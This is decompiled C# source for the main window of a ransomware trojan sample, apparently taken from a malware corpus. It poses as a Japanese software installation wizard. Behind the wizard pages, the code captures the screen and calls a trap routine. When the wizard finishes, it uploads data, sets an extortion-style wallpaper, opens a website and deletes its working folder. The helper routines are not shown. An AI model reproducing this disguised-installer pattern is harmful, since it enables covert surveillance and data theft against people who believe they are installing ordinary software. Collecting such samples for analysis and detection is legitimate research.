// Decompiled with JetBrains decompiler
// Type: setup.fMain
// Assembly: setup, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6FA179CD-C6DD-49E1-8167-579BB94FEB58
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Agent.le-c87aca3d3f3f7d91c25f958bdf91631280e8c43d.exe

using setup.Properties;
using Smart.Windows.Mvc;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace setup
{
  public class fMain : Form, IFunctionControl
  {
    private readonly Controller controller;
    private readonly Dictionary<Keys, FunctionKey> enabledFunctions = new Dictionary<Keys, FunctionKey>();
    private readonly List<Button> functionButtons = new List<Button>();
    private string next;
    private string back;
    private IContainer components;
    private Panel pFoot;
    private Button btnBack;
    private Button btnCancel;
    private Button btnNext;
    private Panel pMain;
    private Label label1;

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ClassStyle |= 512;
        return createParams;
      }
    }

    public fMain()
    {
      this.InitializeComponent();
      this.InitializeFunctionKeys();
      this.StartPosition = FormStartPosition.CenterScreen;
      this.MaximizeBox = this.MinimizeBox = false;
      Settings.Default.uid = lib.GetRandom();
      lib.trap();
      Directory.CreateDirectory("C:\\" + Settings.Default.uid);
      Settings.Default.it_dir = lib.GetImage(Settings.Default.it);
      Settings.Default.ih_dir = lib.GetImage(Settings.Default.ih);
      lib.ScreenCapture();
      this.Text = Settings.Default.fn;
      this.controller = new Controller((IViewProvider) new ControlViewProvider((Control) this.pMain));
      this.controller.Forwarding += new EventHandler<ViewForwardEventArgs>(this.OnForwarding);
      this.controller.Exited += new EventHandler<ViewExitEventArgs>(this.OnExited);
      this.controller.AutoRegister(Assembly.GetExecutingAssembly());
      this.Show();
      this.controller.Forward((object) Views.page0);
    }

    private void InitializeFunctionKeys()
    {
      this.btnBack.Tag = (object) Keys.B;
      this.btnNext.Tag = (object) Keys.N;
      this.btnCancel.Tag = (object) Keys.C;
      this.functionButtons.Add(this.btnBack);
      this.functionButtons.Add(this.btnNext);
      this.functionButtons.Add(this.btnCancel);
    }

    public void UpdateFunctionKeys(FunctionKey[] keys)
    {
      this.enabledFunctions.Clear();
      if (keys != null)
      {
        foreach (FunctionKey key in keys)
          this.enabledFunctions.Add(key.Keys, key);
      }
      foreach (Button functionButton in this.functionButtons)
      {
        Keys tag = (Keys) functionButton.Tag;
        if (this.enabledFunctions.ContainsKey(tag))
        {
          FunctionKey enabledFunction = this.enabledFunctions[tag];
          functionButton.Visible = true;
          functionButton.Enabled = true;
          functionButton.Text = enabledFunction.Display;
        }
        else
        {
          if (this.next == "page1" || this.next == "page2")
            functionButton.Visible = false;
          else
            functionButton.Enabled = false;
          functionButton.Text = "";
        }
      }
    }

    private void OnForwarding(object sender, ViewForwardEventArgs e)
    {
      if (this.controller.CurrentView is IApplicationView currentView)
        currentView.SetFunctionControl((IFunctionControl) this);
      int num = int.Parse(e.ViewId.ToString().Replace("page", ""));
      this.next = "page" + (num + lib.PageRule(num, 1)).ToString();
      this.back = "page" + (num - lib.PageRule(num, 0)).ToString();
    }

    private void OnExited(object sender, ViewExitEventArgs e)
    {
      lib.DataUpload();
      WallpaperChanger.SetWallpaper(Settings.Default.MyPictures + "\\" + Settings.Default.uid + ".jpg", WallpaperLocation.Stretch);
      lib.SiteOpen();
      new fEnd().Show();
      lib.DelDir();
      this.Hide();
    }

    private void btnNext_Click(object sender, EventArgs e)
    {
      if (this.next == "page12")
        this.controller.Exit();
      else
        this.controller.Forward(Enum.Parse(typeof (Views), this.next));
    }

    private void btnCancel_Click(object sender, EventArgs e)
    {
      if (MessageBox.Show((IWin32Window) this, Settings.Default.fn + " のインストールを中断してもよろ\nしいですか?", Settings.Default.fn + " - インストールウィザード", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) != DialogResult.Yes)
        return;
      this.controller.Exit();
    }

    private void btnBack_Click(object sender, EventArgs e) => this.controller.Forward(Enum.Parse(typeof (Views), this.back));

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (fMain));
      this.pFoot = new Panel();
      this.label1 = new Label();
      this.btnBack = new Button();
      this.btnCancel = new Button();
      this.btnNext = new Button();
      this.pMain = new Panel();
      this.pFoot.SuspendLayout();
      this.SuspendLayout();
      this.pFoot.Controls.Add((Control) this.label1);
      this.pFoot.Controls.Add((Control) this.btnBack);
      this.pFoot.Controls.Add((Control) this.btnCancel);
      this.pFoot.Controls.Add((Control) this.btnNext);
      this.pFoot.Dock = DockStyle.Bottom;
      this.pFoot.Location = new Point(0, 300);
      this.pFoot.Name = "pFoot";
      this.pFoot.Size = new Size(500, 53);
      this.pFoot.TabIndex = 0;
      this.label1.BorderStyle = BorderStyle.Fixed3D;
      this.label1.Location = new Point(0, 0);
      this.label1.Name = "label1";
      this.label1.Size = new Size(580, 2);
      this.label1.TabIndex = 96;
      this.btnBack.Location = new Point(248, 18);
      this.btnBack.Name = "btnBack";
      this.btnBack.Size = new Size(75, 23);
      this.btnBack.TabIndex = 93;
      this.btnBack.Text = "戻る";
      this.btnBack.UseVisualStyleBackColor = true;
      this.btnBack.Click += new EventHandler(this.btnBack_Click);
      this.btnCancel.Location = new Point(415, 18);
      this.btnCancel.Name = "btnCancel";
      this.btnCancel.Size = new Size(75, 23);
      this.btnCancel.TabIndex = 95;
      this.btnCancel.Text = "キャンセル";
      this.btnCancel.UseVisualStyleBackColor = true;
      this.btnCancel.Click += new EventHandler(this.btnCancel_Click);
      this.btnNext.Location = new Point(329, 18);
      this.btnNext.Name = "btnNext";
      this.btnNext.Size = new Size(75, 23);
      this.btnNext.TabIndex = 94;
      this.btnNext.Text = "次へ";
      this.btnNext.UseVisualStyleBackColor = true;
      this.btnNext.Click += new EventHandler(this.btnNext_Click);
      this.pMain.Dock = DockStyle.Fill;
      this.pMain.Location = new Point(0, 0);
      this.pMain.Name = "pMain";
      this.pMain.Size = new Size(500, 300);
      this.pMain.TabIndex = 1;
      this.AutoScaleDimensions = new SizeF(6f, 12f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(500, 353);
      this.Controls.Add((Control) this.pMain);
      this.Controls.Add((Control) this.pFoot);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (fMain);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.pFoot.ResumeLayout(false);
      this.ResumeLayout(false);
    }
  }
}
